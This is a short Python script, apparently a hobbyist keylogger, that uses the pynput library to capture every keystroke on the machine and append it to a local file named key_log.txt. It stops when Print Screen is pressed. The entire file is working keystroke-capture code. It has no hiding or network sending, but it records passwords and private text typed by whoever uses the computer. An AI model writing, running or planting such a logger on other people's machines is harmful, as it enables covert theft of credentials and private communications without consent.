from pynput.keyboard import Listener, Key

filename = "key_log.txt"  # The file to write characters to
num = [96, 97, 98, 99, 100, 101, 102, 103, 104, 105]

def on_press(key):
    f = open(filename, 'a')  # Open the file

    if hasattr(key, 'vk') and 96 <= key.vk <= 105:
        f.write(str(num.index(key.vk)))
    elif hasattr(key, 'char'):  # Write the character pressed if available
        f.write(key.char)
    elif key == Key.space:  # If space was pressed, write a space
        f.write(' ')
    elif key == Key.enter:  # If enter was pressed, write a new line
        f.write('\n')
    elif key == Key.tab:  # If tab was pressed, write a tab
        f.write('\t')
    elif key == Key.print_screen: # If PrtSc pressed, kill the app
        f.write("\nExit")
        exit()
    else:  # If anything else was pressed, write [<key_name>]
        f.write('[' + key.name + ']')

    f.close()  # Close the file


with Listener(on_press=on_press) as listener:  # Setup the listener
    listener.join()  # Join the thread to the main thread
